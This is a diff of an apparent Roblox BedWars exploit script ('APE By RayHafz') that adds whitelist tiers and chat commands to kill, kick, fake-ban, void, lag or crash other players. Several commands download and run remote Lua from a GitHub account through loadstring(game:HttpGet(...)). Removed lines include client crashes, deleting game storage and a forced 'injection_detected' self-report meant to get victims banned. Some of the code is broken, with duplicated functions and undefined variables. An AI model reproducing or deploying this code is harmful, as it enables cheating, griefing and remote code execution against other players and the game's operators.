@@ -11749,281 +11749,1054 @@ end
 		return 
 	end
 	
-local function getLplrType()
-	local lplr_Type = 0
-	if whitelist["Owner"] ~= nil then
-		for i,v in pairs(whitelist["Owner"]) do
-			if v.id == tostring(lplr.UserId) then
-				lplr_Type = 4
-				return lplr_Type
-			end
-		end
-	end
-	if whitelist["CoOwner"] ~= nil then
-		for i,v in pairs(whitelist["CoOwner"]) do
-			if v.id == tostring(lplr.UserId) then
-				lplr_Type = 3
-				return lplr_Type
-			end
-		end
-	end
-	if whitelist["PrivatePlus"] ~= nil then
-		for i,v in pairs(whitelist["PrivatePlus"]) do
-			if v.id == tostring(lplr.UserId) then
-				lplr_Type = 2
-				return lplr_Type
-			end
-		end
-	end
-	if whitelist["Private"] ~= nil then
-		for i,v in pairs(whitelist["Private"]) do
-			if v.id == tostring(lplr.UserId) then
-				lplr_Type = 1
-				return lplr_Type
-			end
-		end
-	end
-	if whitelist["RayHafz"] ~= nil then
-		for i,v in pairs(whitelist["RayHafz"]) do
-			if v.id == tostring(lplr.UserId) then
-				lplr_Type = 5
-				return lplr_Type
-			end
-		end
-	end
-	return lplr_Type
-end
-
-local APEUsers = {}
-
-function CanAttackUser(u)
-	local userId = tostring(u.UserId)
-	local userType = 0
-
-	if whitelist["Private"] ~= nil then
-		for i, v in pairs(whitelist["Private"]) do
-			if v.id == userId then
-				userType = 1
+	
+	WhitelistFunctionsAreFunny = {
+	   GetWhitelist = function(plr2)
+		  local userId = tostring(plr2.UserId)
+		  local userType = 0
+		  local userTag = ""
+		  
+		  if whitelist["RayHafz"] ~= nil then
+			for i, v in pairs(whitelist["RayHafz"]) do
+			  if v.id == userId then
+				userType = 5
+				userTag = "RayHafz"
 				break
+			  end
+			end
+		  end
+		
+		  if userType == 0 and whitelist["Owner"] ~= nil then
+			for i, v in pairs(whitelist["Owner"]) do
+			  if v.id == userId then
+				userType = 4
+				userTag = "Owner"
+				break
+			  end
+			end
+		  end
+		  
+		  if userType == 0 and whitelist["CoOwner"] ~= nil then
+			for i, v in pairs(whitelist["CoOwner"]) do
+			  if v.id == userId then
+				userType = 3
+				userTag = "CoOwner"
+				break
+			  end
+			end
+		  end
+		  
+		  if userType == 0 and whitelist["PrivatePlus"] ~= nil then
+			for i, v in pairs(whitelist["PrivatePlus"]) do
+			  if v.id == userId then
+				userType = 2
+				userTag = "PrivatePlus"
+				break
+			  end
+			end
+		  end
+		  
+		  if userType == 0 and whitelist["Private"] ~= nil then
+			for i, v in pairs(whitelist["Private"]) do
+			  if v.id == userId then
+				userType = 1
+				userTag = "Private"
+				break
+			  end
+			end
+		  end
+	
+		  return userType, userTag
+	   end
+	}
+	
+	
+	local function getLplrType()
+		local lplr_Type = 0
+		if whitelist["CoOwner"] ~= nil then
+			for i,v in pairs(whitelist["CoOwner"]) do
+				if v.id == tostring(lplr.UserId) then
+					lplr_Type = 3
+					return lplr_Type
+				end
 			end
 		end
+		if whitelist["Private"] ~= nil then
+			for i,v in pairs(whitelist["Private"]) do
+				if v.id == tostring(lplr.UserId) then
+					lplr_Type = 1
+					return lplr_Type
+				end
+			end
+		end
+		if whitelist["PrivatePlus"] ~= nil then
+			for i,v in pairs(whitelist["PrivatePlus"]) do
+				if v.id == tostring(lplr.UserId) then
+					lplr_Type = 2
+					return lplr_Type
+				end
+			end
+		end
+		if whitelist["Owner"] ~= nil then
+			for i,v in pairs(whitelist["Owner"]) do
+				if v.id == tostring(lplr.UserId) then
+					lplr_Type = 4
+					return lplr_Type
+				end
+			end
+		end
+		if whitelist["RayHafz"] ~= nil then
+			for i,v in pairs(whitelist["RayHafz"]) do
+				if v.id == tostring(lplr.UserId) then
+					lplr_Type = 5
+					return lplr_Type
+				end
+			end
+		end
+		return lplr_Type
 	end
+	
+	
+	
+	
+	local Users = {}
+	
+	function CanAttackUser(u)
+		local userId = tostring(u.UserId)
+		local userType = 0
+	
+		if whitelist["Private"] ~= nil then
+			for i, v in pairs(whitelist["Private"]) do
+				if v.id == userId then
+					userType = 1
+					break
+				end
+			end
+		end
 	
 		if whitelist["PrivatePlus"] ~= nil then
-		for i, v in pairs(whitelist["PrivatePlus"]) do
-			if v.id == userId then
-				userType = 2
-				break
+			for i, v in pairs(whitelist["PrivatePlus"]) do
+				if v.id == userId then
+					userType = 2
+					break
+				end
 			end
 		end
+	
+		if whitelist["CoOwner"] ~= nil then
+			for i, v in pairs(whitelist["CoOwner"]) do
+				if v.id == userId then
+					userType = 3
+					break
+				end
+			end
+		end
+		
+		if whitelist["Owner"] ~= nil then
+			for i, v in pairs(whitelist["Owner"]) do
+				if v.id == userId then
+					userType = 4
+					break
+				end
+			end
+		end
+		
+		if whitelist["RayHafz"] ~= nil then
+			for i, v in pairs(whitelist["RayHafz"]) do
+				if v.id == userId then
+					userType = 5
+					break
+				end
+			end
+		end
+	
+		return getLplrType() >= userType
 	end
 	
-	if whitelist["CoOwner"] ~= nil then
-		for i, v in pairs(whitelist["CoOwner"]) do
-			if v.id == userId then
-				userType = 3
-				break
+	
+	local function getLplrType()
+		local lplr_Type = 0
+		if whitelist["CoOwner"] ~= nil then
+			for i,v in pairs(whitelist["CoOwner"]) do
+				if v.id == tostring(lplr.UserId) then
+					lplr_Type = 3
+					return lplr_Type
+				end
 			end
 		end
+		if whitelist["RayHafz"] ~= nil then
+			for i,v in pairs(whitelist["RayHafz"]) do
+				if v.id == tostring(lplr.UserId) then
+					lplr_Type = 5
+					return lplr_Type
+				end
+			end
+		end
+		if whitelist["Owner"] ~= nil then
+			for i,v in pairs(whitelist["Owner"]) do
+				if v.id == tostring(lplr.UserId) then
+					lplr_Type = 4
+					return lplr_Type
+				end
+			end
+		end
+		if whitelist["Private"] ~= nil then
+			for i,v in pairs(whitelist["Private"]) do
+				if v.id == tostring(lplr.UserId) then
+					lplr_Type = 1
+					return lplr_Type
+				end
+			end
+		end
+		if whitelist["PrivatePlus"] ~= nil then
+			for i,v in pairs(whitelist["PrivatePlus"]) do
+				if v.id == tostring(lplr.UserId) then
+					lplr_Type = 2
+					return lplr_Type
+				end
+			end
+		end
+		return lplr_Type
 	end
 	
-	if whitelist["Owner"] ~= nil then
-		for i, v in pairs(whitelist["Owner"]) do
-			if v.id == userId then
-				userType = 4
-				break
+	local Users = {}
+	
+	function CanAttackUser(u)
+		local userId = tostring(u.UserId)
+		local userType = 0
+	
+		if whitelist["Private"] ~= nil then
+			for i, v in pairs(whitelist["Private"]) do
+				if v.id == userId then
+					userType = 1
+					break
+				end
 			end
 		end
+	
+		if whitelist["PrivatePlus"] ~= nil then
+			for i, v in pairs(whitelist["PrivatePlus"]) do
+				if v.id == userId then
+					userType = 2
+					break
+				end
+			end
+		end
+	
+		if whitelist["CoOwner"] ~= nil then
+			for i, v in pairs(whitelist["CoOwner"]) do
+				if v.id == userId then
+					userType = 3
+					break
+				end
+			end
+		end
+		
+		if whitelist["Owner"] ~= nil then
+			for i, v in pairs(whitelist["Owner"]) do
+				if v.id == userId then
+					userType = 4
+					break
+				end
+			end
+		end
+		
+		if whitelist["RayHafz"] ~= nil then
+			for i, v in pairs(whitelist["RayHafz"]) do
+				if v.id == userId then
+					userType = 5
+					break
+				end
+			end
+		end
+	
+		return getLplrType() >= userType
 	end
 	
-	if whitelist["RayHafz"] ~= nil then
-		for i, v in pairs(whitelist["RayHafz"]) do
-			if v.id == userId then
-				userType = 5
-				break
+	local function getPlayerByType(type)
+		for _, player in pairs(game.Players:GetPlayers()) do
+			local userType, userTag = WhitelistFunctionsAreFunny:GetWhitelist(player)
+			if userType == type then
+				return player
 			end
 		end
+		return nil
 	end
-
-	return getLplrType() >= userType
-end
-
-local commands = {
-	[";kill default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
-		end
-	end,
-	[";reveal default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local textChatService = game:GetService("TextChatService")
-			wait(0.0001)
-			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("APE By RayHafz")
-		end
-	end,
-	[";void default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local character = game.Players.LocalPlayer.Character
-			local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
-			local newPosition = humanoidRootPart.CFrame
-			for i = 1, 3 do
-				newPosition = newPosition + Vector3.new(0, -40, 0)
-				humanoidRootPart.CFrame = newPosition
-				wait(0.01)
+	
+	local commands = {
+		[";kill default"] = function()
+				local defaultPlayer = getPlayerByType(0)
+				if defaultPlayer then
+					defaultPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+				else
+					print("No default player found!")
 			end
-		end
-	end,
-	[";blind default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local blur = Instance.new("BlurEffect")
-			blur.Size = 10000000000000
-			blur.Parent = game.Lighting
-		end
-	end,
-	[";unblind default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
-			if blur then
-				blur:Destroy()
+		end,
+		[";kill private"] = function()
+				local privatePlayer = getPlayerByType(1) 
+				if privatePlayer then
+					privatePlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+				else
+					print("No private player found!")
+				
 			end
-		end
-	end,
-	[";troll default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/trollage.lua"))()
-		end
-	end,
-	[";kick default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			wait(1)
-			for index, player in pairs(game.Players:GetPlayers()) do
-				player:Kick("RayHafz Kick u")
+		end,
+		[";kill privateplus"] = function()
+				local privateplusPlayer = getPlayerByType(2) 
+				if privateplusPlayer then
+					privateplusPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+				else
+					print("No private+ player found!")
+				
 			end
-		end
-	end,
-	[";ban default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local rs = game:GetService("ReplicatedStorage")
-			local remote = rs:FindFirstChild("SelfReport", true)
-			remote:FireServer("injection_detected")
-		end
-	end,
-	[";rickroll default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))()
-		end
-	end,
-	[";freeze default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
-		end
-	end,
-	[";thaw default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
-		end
-	end,
-	[";lobby default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
-		end
-	end,
-	[";quitgame default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			game:Shutdown()
-		end
-	end,
-	[";lagback default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			for i = 1, 10 do
-				wait()
-				local player = game.Players.LocalPlayer
-				local character = player.Character or player.CharacterAdded:Wait()
+		end,
+		[";kill coowner"] = function()
+				local coownerPlayer = getPlayerByType(3) 
+				if coownerPlayer then
+					coownerPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+				else
+					print("No coowner player found!")
+				
+			end
+		end,
+		[";kill owner"] = function()
+				local ownerPlayer = getPlayerByType(4) 
+				if ownerPlayer then
+					ownerPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+				else
+					print("No owner player found!")
+				
+			end
+		end,
+		
+		[";void default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				local character = defaultPlayer.Character
 				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
-				local forwardVector = humanoidRootPart.CFrame.LookVector
-				local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
-				humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
+				local newPosition = humanoidRootPart.CFrame
+				for i = 1, 3 do
+					newPosition = newPosition + Vector3.new(0, -40, 0)
+					humanoidRootPart.CFrame = newPosition
+					wait(0.01)
+				end
+			else
+				print("No default player found!")
 			end
-		end
-	end,
-	[";breakgame default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			pcall(function()
-				local replicatedStorage = game:GetService("ReplicatedStorage")
-				for _, child in ipairs(replicatedStorage:GetDescendants()) do
-					child:Destroy()
+		end,
+		[";void private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+				local character = privatePlayer.Character
+				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+				local newPosition = humanoidRootPart.CFrame
+				for i = 1, 3 do
+					newPosition = newPosition + Vector3.new(0, -40, 0)
+					humanoidRootPart.CFrame = newPosition
+					wait(0.01)
 				end
-			end)
-		end
-	end,
-	[";breakmap default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local function unanchorParts(object)
-				if object:IsA("BasePart") then
-					object.Anchored = false
-				end
-				for _, child in ipairs(object:GetChildren()) do
-					unanchorParts(child)
-				end
+			else
+				print("No private player found!")
 			end
-			unanchorParts(workspace)
-		end
-	end,
-	[";crash default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			while true do end
-		end
-	end,
-	[";infping default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local thingy = settings().Network
-			thingy.IncomingReplicationLag = math.huge
-		end
-	end,
-	[";lag default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
-			local RunService = game:GetService("RunService")
-			local player = game.Players.LocalPlayer
-			local character = player.Character or player.CharacterAdded:Wait()
-			local rootPart = character:WaitForChild("HumanoidRootPart")
-			RunService.Heartbeat:Connect(function()
-				for i = 1, 100 do
-					local part = Instance.new("Part")
-					part.Anchored = false
-					part.CanCollide = true
-					part.Transparency = 1
-					part.CFrame = rootPart.CFrame + Vector3.new(0, 100000, 0)
-					part.Parent = workspace
+		end,
+		[";void privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2)
+			if privateplusPlayer then
+				local character = privateplusPlayer.Character
+				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+				local newPosition = humanoidRootPart.CFrame
+				for i = 1, 3 do
+					newPosition = newPosition + Vector3.new(0, -40, 0)
+					humanoidRootPart.CFrame = newPosition
+					wait(0.01)
 				end
-			end)
-		end
-	end,
-	[";loopkill default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			_G.loopkill = true;
-			while _G.loopkill do
-				Game.Players.LocalPlayer.Character.Humanoid.Health = 0
-				wait(4)
-			end			
-		end
-	end,
-	[";unloopkill default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			_G.loopkill = false;
-			while _G.loopkill do
-				Game.Players.LocalPlayer.Character.Humanoid.Health = 0
-				wait(3)			
+			else
+				print("No private+ player found!")
 			end
-		end
-	end,
-	[";fakeban default"] = function(args)
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
-		    end
-		    bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
-	    end,
-	[";byfron default"] = function(args, plr)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		end,
+		[";void coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
+				local character = coownerPlayer.Character
+				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+				local newPosition = humanoidRootPart.CFrame
+				for i = 1, 3 do
+					newPosition = newPosition + Vector3.new(0, -40, 0)
+					humanoidRootPart.CFrame = newPosition
+					wait(0.01)
+				end
+			else
+				print("No coowner player found!")
+			end
+		end,
+		[";void owner"] = function()
+			local ownerPlayer = getPlayerByType(4)
+			if ownerPlayer then
+				local character = ownerPlayer.Character
+				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+				local newPosition = humanoidRootPart.CFrame
+				for i = 1, 3 do
+					newPosition = newPosition + Vector3.new(0, -40, 0)
+					humanoidRootPart.CFrame = newPosition
+					wait(0.01)
+				end
+			else
+				print("No private player found!")
+			end
+		end,
+		
+		[";kick default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				defaultPlayer:Kick("You just got kicked from the game | :troll:")
+			else
+				print("No default player found!")
+			end
+		end,
+		[";kick private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+				privatePlayer:Kick("You just got kicked from the game | :troll:")
+			else
+				print("No private player found!")
+			end
+		end,
+		[";kick privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2)
+			if privateplusPlayer then
+				privateplusPlayer:Kick("You just got kicked from the game | :troll:")
+			else
+				print("No private+ player found!")
+			end
+		end,
+		[";kick coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
+				coownerPlayer:Kick("You just got kicked from the game | :troll:")
+			else
+				print("No coowner player found!")
+			end
+		end,
+		[";kick owner"] = function()
+			local ownerPlayer = getPlayerByType(4)
+			if ownerPlayer then
+				ownerPlayer:Kick("You just got kicked from the game | :troll:")
+			else
+				print("No owner player found!")
+			end
+		end,
+		
+		[";ban default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				defaultPlayer:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes " .. math.random(45, 59) .. " seconds ]")
+			else
+				print("No default player found!")
+			end
+		end,
+		[";ban private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+				privatePlayer:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes " .. math.random(45, 59) .. " seconds ]")
+			else
+				print("No private player found!")
+			end
+		end,
+		[";ban privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2)
+			if privateplusPlayer then
+				privateplusPlayer:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes " .. math.random(45, 59) .. " seconds ]")
+			else
+				print("No private+ player found!")
+			end
+		end,
+		[";ban coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
+				coownerPlayer:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes " .. math.random(45, 59) .. " seconds ]")
+			else
+				print("No coowner player found!")
+			end
+		end,
+		[";ban owner"] = function()
+			local ownerPlayer = getPlayerByType(4)
+			if ownerPlayer then
+				ownerPlayer:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes " .. math.random(45, 59) .. " seconds ]")
+			else
+				print("No owner player found!")
+			end
+		end,
+		
+		[";lobby default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer(defaultPlayer)
+			else
+				print("No default player found!")
+			end
+		end,
+		[";lobby private"] = function()
+			local privatePlayer = getPlayerByType(1) 
+			if privatePlayer then
+				game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer(privatePlayer)
+			else
+				print("No private player found!")
+			end
+		end,
+		[";lobby privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2) 
+			if privateplusPlayer then
+				game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer(privatePlayer)
+			else
+				print("No private+ player found!")
+			end
+		end,
+		[";lobby coowner"] = function()
+			local coownerPlayer = getPlayerByType(3) 
+			if coownerPlayer then
+				game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer(privatePlayer)
+			else
+				print("No coowner player found!")
+			end
+		end,
+		[";lobby owner"] = function()
+			local ownerPlayer = getPlayerByType(4) 
+			if ownerPlayer then
+				game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer(privatePlayer)
+			else
+				print("No owner player found!")
+			end
+		end,
+		
+		[";shutdown default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				game:Shutdown()
+			else
+				print("No default player found!")
+			end
+		end,
+		[";shutdown private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+				game:Shutdown()
+			else
+				print("No private player found!")
+			end
+		end,	
+		[";shutdown privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2)
+			if privateplusPlayer then
+				game:Shutdown()
+			else
+				print("No private+ player found!")
+			end
+		end,
+		[";shutdown coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
+				game:Shutdown()
+			else
+				print("No coowner player found!")
+			end
+		end,
+		[";shutdown owner"] = function()
+			local ownerPlayer = getPlayerByType(4)
+			if ownerPlayer then
+				game:Shutdown()
+			else
+				print("No owner player found!")
+			end
+		end,
+		
+		[";lagback default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				for i = 1, 10 do
+					wait()
+					local character = defaultPlayer.Character or defaultPlayer.CharacterAdded:Wait()
+					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+					local forwardVector = humanoidRootPart.CFrame.LookVector
+					local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
+					humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
+				end
+			else
+				print("No default player found!")
+			end
+		end,
+		[";lagback private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+				for i = 1, 10 do
+					wait()
+					local character = privatePlayer.Character or privatePlayer.CharacterAdded:Wait()
+					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+					local forwardVector = humanoidRootPart.CFrame.LookVector
+					local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
+					humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
+				end
+			else
+				print("No private player found!")
+			end
+		end,
+		[";lagback privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2)
+			if privateplusPlayer then
+				for i = 1, 10 do
+					wait()
+					local character = privateplusPlayer.Character or privateplusPlayer.CharacterAdded:Wait()
+					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+					local forwardVector = humanoidRootPart.CFrame.LookVector
+					local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
+					humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
+				end
+			else
+				print("No private+ player found!")
+			end
+		end,
+		[";lagback coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
+				for i = 1, 10 do
+					wait()
+					local character = coownerPlayer.Character or coownerPlayer.CharacterAdded:Wait()
+					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+					local forwardVector = humanoidRootPart.CFrame.LookVector
+					local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
+					humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
+				end
+			else
+				print("No coowner player found!")
+			end
+		end,
+		[";lagback owner"] = function()
+			local ownerPlayer = getPlayerByType(4)
+			if ownerPlayer then
+				for i = 1, 10 do
+					wait()
+					local character = ownerPlayer.Character or ownerPlayer.CharacterAdded:Wait()
+					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+					local forwardVector = humanoidRootPart.CFrame.LookVector
+					local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
+					humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
+				end
+			else
+				print("No owner player found!")
+			end
+		end,
+		
+		[";destroymap default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				local function unanchorParts(object)
+					if object:IsA("BasePart") then
+						object.Anchored = false
+					end
+					for _, child in ipairs(object:GetChildren()) do
+						unanchorParts(child)
+					end
+				end
+				unanchorParts(defaultPlayer.Character)
+			else
+				print("No default player found!")
+			end
+		end,
+		[";destroymap private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+				local function unanchorParts(object)
+					if object:IsA("BasePart") then
+						object.Anchored = false
+					end
+					for _, child in ipairs(object:GetChildren()) do
+						unanchorParts(child)
+					end
+				end
+				unanchorParts(privatePlayer.Character)
+			else
+				print("No private player found!")
+			end
+		end,
+		[";destroymap privateplus"] = function()
+			local privatePlayer = getPlayerByType(2)
+			if privateplusPlayer then
+				local function unanchorParts(object)
+					if object:IsA("BasePart") then
+						object.Anchored = false
+					end
+					for _, child in ipairs(object:GetChildren()) do
+						unanchorParts(child)
+					end
+				end
+				unanchorParts(privateplusPlayer.Character)
+			else
+				print("No private+ player found!")
+			end
+		end,
+		[";destroymap coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
+				local function unanchorParts(object)
+					if object:IsA("BasePart") then
+						object.Anchored = false
+					end
+					for _, child in ipairs(object:GetChildren()) do
+						unanchorParts(child)
+					end
+				end
+				unanchorParts(coownerPlayer.Character)
+			else
+				print("No coowner player found!")
+			end
+		end,
+		[";destroymap owner"] = function()
+			local ownerPlayer = getPlayerByType(4)
+			if ownerPlayer then
+				local function unanchorParts(object)
+					if object:IsA("BasePart") then
+						object.Anchored = false
+					end
+					for _, child in ipairs(object:GetChildren()) do
+						unanchorParts(child)
+					end
+				end
+				unanchorParts(ownerPlayer.Character)
+			else
+				print("No private player found!")
+			end
+		end,
+		
+		[";troller default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/trollage.lua"))()
+			else
+				print("No default player found!")
+			end
+		end,
+		[";troller private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/trollage.lua"))()
+			else
+				print("No private player found!")
+			end
+		end,
+		[";troller privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2)
+			if privateplusPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/trollage.lua"))() 
+			else
+				print("No private+ player found!")
+			end
+		end,
+		[";troller coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/trollage.lua"))()
+			else
+				print("No coowner player found!")
+			end
+		end,
+		[";troller owner"] = function()
+			local ownerPlayer = getPlayerByType(4)
+			if ownerPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/trollage.lua"))() 
+			else
+				print("No owner player found!")
+			end
+		end,
+		
+		[";rickroll default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))()
+			else
+				print("No default player found!")
+			end
+		end,
+		[";rickroll private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))() 
+			else
+				print("No private player found!")
+			end
+		end,
+		[";rickroll privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2)
+			if privateplusPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))() 
+			else
+				print("No private+ player found!")
+			end
+		end,
+		[";rickroll coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))() 
+			else
+				print("No coowner player found!")
+			end
+		end,
+		[";rickroll owner"] = function()
+			local ownerPlayer = getPlayerByType(4)
+			if ownerPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))() 
+			else
+				print("No owner player found!")
+			end
+		end,
+
+		[";chipman default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/chipman.lua"))()
+			else
+				print("No default player found!")
+			end
+		end,
+		[";chipman private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/chipman.lua"))()
+			else
+				print("No private player found!")
+			end
+		end,
+		[";chipman privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2)
+			if privateplusPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/chipman.lua"))() 
+			else
+				print("No private+ player found!")
+			end
+		end,
+		[";chipman coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
